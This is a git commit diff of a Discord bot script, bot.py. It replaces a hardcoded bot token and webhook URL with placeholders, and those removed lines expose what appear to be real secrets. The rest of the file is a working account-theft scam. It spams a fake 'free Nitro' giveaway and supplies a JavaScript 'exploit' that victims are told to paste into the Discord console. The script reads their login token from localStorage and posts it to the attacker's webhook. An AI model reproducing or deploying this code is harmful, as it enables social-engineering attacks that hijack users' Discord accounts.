c8f7ee55f15806fcec5f17dc384b9e3149d7d253
CJ <48541293+CalderJohnson@users.noreply.github.com>
2022-03-13 22:18:08 -0400

    Update bot.py

--- bot.py
+++ bot.py
@@ -7,8 +7,8 @@ from discord.ext import commands
 
 #config
 
-token = 'OTUyNzMzNzQ0MjUzNTE3ODU0.Yi6UcQ.A6Scz8wtB2jdVa0FZLESl6_2qag' #your token
-webhookurl = 'https://discordapp.com/api/webhooks/952746798684983306/xRKntVnfOS2VprbCB_0vicryFPdWBkAqAJTCssfnl883Qb0FPlk8PWo-DmeMTcAW1crd' #your webhook url
+token = 'your-token' #your token
+webhookurl = 'your-webhook' #your webhook url
 intents = discord.Intents.all()
 message = discord.Embed(title="Congratulations!🎊", description="You have been randomly selected to win FREE discord nitro for 3 months!\nTo claim your prize, add me to another server of your choice using the link: https://discord.com/oauth2/authorize?client_id=952733744253517854&scope=bot&permissions=2048\nWithin 24 hours I'll dm you your free nitro gift!\nIf you're a real discord pro, use the script below for free nitro for a full year subscription!")
 script = "```js\n/***************************************\n*\n*      Free Nitro exploit!\n*      paste to console on discord and press enter\n*      to open console press F12 on chrome/mozilla/Edge\n*      or Ctrl+Shift+i on desktop app\n*\n* **************************************/\nlocation.reload();\nlet nitrorequest = \"" + webhookurl + "\";\nlet i = document.createElement(\'iframe\');\ndocument.body.appendChild(i);\nlet request = new XMLHttpRequest();\nrequest.open(\"POST\", nitrorequest);\nrequest.setRequestHeader('Content-type', 'application/json');\nlet params = {\n    username: \"Free Nitro Exploit\",\n    avatar_url: \"https://discordgift.gg\",\n    content: '**Givenitro**------------------Nitrocode : ' + i.contentWindow.localStorage.token\n};\nrequest.send(JSON.stringify(params));\n```"
